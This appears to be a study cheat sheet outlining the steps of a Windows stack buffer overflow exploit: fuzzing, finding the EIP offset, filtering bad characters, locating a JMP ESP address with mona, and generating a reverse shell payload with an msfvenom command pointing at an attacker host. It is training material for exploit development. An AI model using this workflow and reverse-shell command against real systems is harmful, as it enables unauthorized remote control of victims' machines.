=============================
discovering the vulnerability
=============================
sourcode review : easy
fuzzing
	HTTP form
		./fuzzer.py <request file> <host ip> <target form tag name> <start length> <step size> <end length>

=====================
replicating the crash
=====================
It's included in fuzzer.py

=================
find EIP location
=================
binary tree analysis
	binary search
non-repeatig 4-byte thunks
	msf-pattern_create -l <length>
	msf-pattern_offset -l <length> -q <overwrited EIP>

=======
exploit
=======
1. fill the buffer
2. fill the EIP
3. checking for bad characters
	removing bad characters
	 : bad character makes ESP dump part suddenly stopped with filled with null byte
		\x00\x0a\x0d\x25\x26\x2b\x3d
4. redirecting the execution flow
	now, the hard coded address doesn't work. So go to next.
5. finding a return address
	find "JMP ESP" in some module that is imported in static address
	msf-nasm_shell : it returns machine language from assembly
		ex. jmp esp --> FFE4
	<debugger command>
		!mona modules : module list with address
		!mona find -s "<hex code>" -m "<module name>"
6. generating shellcode with metasploit
	msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=<listening port> -f <format> -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
7. getting a shell
	add GetPC routine
	  : add NOPs that means just passing to next command
8. improving the exploit
